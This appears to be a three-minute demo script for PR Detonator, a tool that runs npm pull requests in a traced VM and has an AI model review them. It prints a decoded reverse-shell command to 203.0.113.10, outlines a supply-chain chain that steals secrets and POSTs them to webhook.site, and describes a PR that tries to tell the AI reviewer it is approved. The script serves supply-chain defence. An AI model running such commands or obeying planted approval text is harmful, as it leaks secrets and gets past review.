# PR Detonator: 3-minute demo script

Everything shown is real: real GitHub PRs on
[pr-detonator-demo/demo-target](https://github.com/pr-detonator-demo/demo-target/pulls), a
real Chamber VM with eBPF tracing, and real Meta models. Record with the PR tabs pre-opened;
each check takes 30–60 s, so trigger fresh runs before recording (push an empty commit to
each branch) and show the finished results.

## 0:00 – 0:20 · The problem

> "In 2025 a worm called Shai-Hulud spread through hundreds of npm packages. It got in
> through ordinary version bumps, ran at `npm install`, and stole every secret it could
> find. Code review didn't catch it: the PR diff was one line. So we built a reviewer that
> doesn't read the code. It **runs** it."

Show: [PR #12](https://github.com/pr-detonator-demo/demo-target/pull/12), "Bump color-helper
from 1.0.0 to 1.0.1", a Dependabot-style one-line diff.

## 0:20 – 1:00 · The dependency did it (E8)

1. Scroll to the check: **🛑 Blocked**. Merge button disabled (branch protection).
2. Open **Files changed**: the inline comment sits on the bumped line and names
   **color-helper**: "this line brings in the dependency color-helper, whose install script
   ran during `npm install` and triggered `NET_RAW_IP`".
3. In the report: *Packages that ran install scripts* → 🛑 dependency color-helper.

> "The author is innocent. The kernel recorded that npm ran color-helper's install script,
> and that script opened a socket. We blame the exact line that brought it in."

## 1:00 – 1:30 · We rebuilt Shai-Hulud (eval case r02)

Show the eval table's incident rows and the real detonation (`eval/results.md`, scored at
`00b06f7`): postinstall → `node bundle.js` → downloads the *real* TruffleHog from GitHub →
runs it from `/tmp` → POSTs to webhook.site.

> "Before we rebuilt it, our rules only said 'needs review': GitHub is allowlisted and
> webhook.site is just a domain. Rebuilding the real attack showed the gap, and two
> kernel-level rules closed it: running a dropped binary, and talking to an exfil service.
> And the Chamber sinkholes those services, so even a working payload leaks nothing."

## 1:30 – 2:00 · Obfuscation decoded on the line (E5)

[PR #8](https://github.com/pr-detonator-demo/demo-target/pull/8): inline comment on
`scripts/telemetry-optout.js` line 8. Muse decoded the base64 to
`bash -i >& /dev/tcp/203.0.113.10/4444 0>&1`.

> "Deterministic code finds the line; the Meta model explains it in plain English."

## 2:00 – 2:25 · It can't be talked out of it (E6)

[PR #9](https://github.com/pr-detonator-demo/demo-target/pull/9): the PR body and
package.json tell the AI reviewer the PR is approved.

> "Muse flags the injection itself. And even if it believed it, the model can only escalate:
> the kernel facts set a floor it can't lower. Prompt Guard 2 runs too: we measured it, it
> catches explicit jailbreaks but not this kind, which is exactly why the floor exists."

## 2:25 – 2:45 · And it doesn't cry wolf

Show the eval table: 26 popular packages with install-time downloads (puppeteer, electron,
prisma, cypress, …): **0 blocked**. 14 of 14 simulated attacks and both real-incident
reconstructions blocked.

> "Muse predicts what the PR should do *before* it runs, from the title and description
> only. Code checks the prediction against the kernel. That's how prisma's engine download
> gets cleared and the attacks don't."

## 2:45 – 3:00 · Where this goes

> "Every new version of the top npm packages, detonated minutes after publish. A signed
> record of what each version does at install, a behavioral SBOM. Lockfiles pin bytes; this
> pins behavior."

## Fallbacks

- If a live check is slow, show the already-completed run on the same PR.
- If the Chamber is down: the PR comments and inline reviews stay on GitHub as evidence.
